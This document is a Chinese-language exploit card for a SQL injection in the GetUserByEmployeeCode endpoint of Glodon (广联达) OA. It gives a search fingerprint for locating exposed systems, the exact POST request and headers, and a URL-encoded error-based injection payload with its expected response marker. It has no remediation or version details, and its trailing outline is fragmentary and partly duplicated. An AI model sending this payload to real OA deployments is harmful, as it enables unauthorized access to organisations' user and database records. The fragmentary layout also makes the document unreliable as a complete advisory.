# 广联达OAGetUserByEmployeeCodeSQL注入漏洞

- **系统**：广联达OAGetUserByEmployeeCode　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1`
- **关键头**：`Content-Length: 39`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
employeeCode=1%27+AND+9748+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289748%3D9748%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29+AND+%27KENl%27%3D%27KENl&EncryptData=1
qbvjq1qxzzq
sqlmap
POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host:
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
employeeCode=1&EncryptData=1
>
```

**其他**
- 广联达OA GetUserByEmployeeCode SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA